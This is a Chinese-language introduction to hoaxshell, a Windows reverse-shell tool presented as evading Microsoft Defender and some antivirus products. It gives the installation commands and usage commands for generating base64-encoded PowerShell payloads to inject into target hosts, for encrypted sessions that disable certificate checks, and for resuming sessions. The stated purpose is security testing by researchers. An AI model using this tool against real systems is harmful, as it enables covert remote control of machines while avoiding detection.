## 关于hoaxshell

hoaxshell是一款功能强大的非传统Windows反向Shell，当前版本的Microsoft
Defender和部分反病毒解决方案基本无法检测到hoaxshell的存在。该工具易于使用，不仅可以生成其自己的PowerShell
Payload，而且还可以支持加密（SSL），可以帮助广大研究人员测试Windows系统的安全性。

当前版本的hoaxshell已在最新的Windows 11企业版和Windows 10专业版进行过测试。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地，并使用pip3和项目提供的requirements.txt安装该工具所需的其他依赖组件，最后给hoaxshell.py提供可执行权限：

    
    
    git clone https://github.com/t3l3machus/hoaxshell
    
    cd ./hoaxshell
    
    sudo pip3 install -r requirements.txt
    
    chmod +x hoaxshell.py

## 工具使用

注意事项：作为一种可以绕过安全检测的方法，hoaxshell会在每次启动脚本时自动为会话id、URL路径和进程中使用的自定义http头的名称生成随机值。生成的Payload将仅适用于为其生成的实例，我们可以使用-g选项关闭此特性，并重新建立活动会话，或使用新的hoaxshell实例重用以前生成的Payload。

### 通过http生成基础Shell会话

    
    
    sudo python3 hoaxshell.py -s <your_ip>

当你运行hoaxshell时，它将生成自己的PowerShell
Payload，以便注入到目标主机中。默认情况下，为了方便起见，Payload使用的是base64编码。如果需要原始Payload，可以使用“raw*payload”命令或“-r”参数。当Payload在目标设备上运行之后，我们就可以对其运行PowerShell命令了。

### 加密Shell会话（https）

    
    
    # 生成自签名证书:
    
    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
    
    # 以参数形式传递cert.pem和key.pem:
    
    sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>

生成的PowerShell Payload的长度将更长，因为还有一块代码需要负责禁用ssl证书验证。

### 获取会话模式

如果你意外关闭了终端，你还可以通过“获取会话模式”来重新启动hoaxshell，该模式将重新建立会话，但前提是我们的Payload仍然还在目标设备上运行：

    
    
    sudo python3 hoaxshell.py -s <your_ip> -g

## 工具运行截图

### Windows 10测试

![](https://image.3001.net/images/20220830/1661838351_630da40f492cc68c330a2.png!small)

### Windows 11测试

![](https://image.3001.net/images/20220830/1661838361_630da419981e099227728.png!small)

## 工具演示视频

 **视频地址** ： _https://www.you*tube.com/watch?v=SEufgD5UxdU_

## 许可证协议

本项目的开发与发布遵循[BSD-2-Clause](https://github.com/t3l3machus/hoaxshell/blob/main/LICENSE.md)开源许可证协议。

## 项目地址

 **hoaxshell** ：【[ _GitHub传送门_](https://github.com/t3l3machus/hoaxshell)】

  

